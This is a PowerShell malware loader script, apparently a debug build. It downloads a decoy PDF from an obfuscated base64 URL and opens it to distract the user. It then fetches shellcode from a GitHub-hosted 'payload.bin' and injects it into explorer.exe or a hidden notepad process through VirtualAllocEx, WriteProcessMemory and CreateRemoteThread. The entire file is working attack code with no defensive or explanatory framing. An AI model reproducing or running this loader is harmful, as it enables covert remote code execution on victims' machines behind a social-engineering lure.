# launcher.ps1 – Debug injection
$ErrorActionPreference = 'Continue'
$log = "C:\debug.txt"

function Write-Log { param($msg) Add-Content -Path $log -Value "$(Get-Date): $msg" }

Write-Log "Script started"

# Decoy PDF (same as before)
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$pdfPath = "$env:TEMP\nakaz.pdf"
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
Start-Process $pdfPath
Write-Log "PDF downloaded and opened"

$shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
try {
    $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content
    Write-Log "Shellcode downloaded, size: $($shellcode.Length)"
} catch {
    Write-Log "Failed to download shellcode: $_"
    exit
}

# Target process
$target = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $target) {
    Write-Log "Explorer not found, starting notepad"
    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500
}
Write-Log "Target process: $($target.Name) PID: $($target.Id)"

# Win32 API
$code = @'
using System;
using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint GetLastError();
}
'@
Add-Type $code

$pid = $target.Id
$hProcess = [Inject]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -eq 0) {
    $err = [Inject]::GetLastError()
    Write-Log "OpenProcess failed, error: $err"
    exit
}
Write-Log "OpenProcess success"

$addr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
if ($addr -eq 0) {
    $err = [Inject]::GetLastError()
    Write-Log "VirtualAllocEx failed, error: $err"
    [Inject]::CloseHandle($hProcess)
    exit
}
Write-Log "VirtualAllocEx success, address: $addr"

$bytesWritten = [UIntPtr]::Zero
$writeResult = [Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $writeResult) {
    $err = [Inject]::GetLastError()
    Write-Log "WriteProcessMemory failed, error: $err"
    [Inject]::CloseHandle($hProcess)
    exit
}
Write-Log "WriteProcessMemory success, bytes written: $bytesWritten"

$thread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq 0) {
    $err = [Inject]::GetLastError()
    Write-Log "CreateRemoteThread failed, error: $err"
} else {
    Write-Log "CreateRemoteThread success, thread handle: $thread"
}
[Inject]::CloseHandle($hProcess)
Write-Log "Injection complete"
